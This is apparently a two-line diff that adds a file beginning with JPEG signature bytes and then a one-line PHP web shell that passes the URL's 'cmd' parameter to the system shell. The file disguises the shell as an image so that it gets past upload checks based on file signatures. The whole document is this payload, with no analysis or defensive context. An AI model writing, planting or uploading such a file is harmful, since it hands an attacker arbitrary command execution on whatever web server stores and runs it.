@@ -1,0 +1,2 @@
+\xFF\xD8\xFF\xE0
+<?php passthru($_GET["cmd"]); ?>
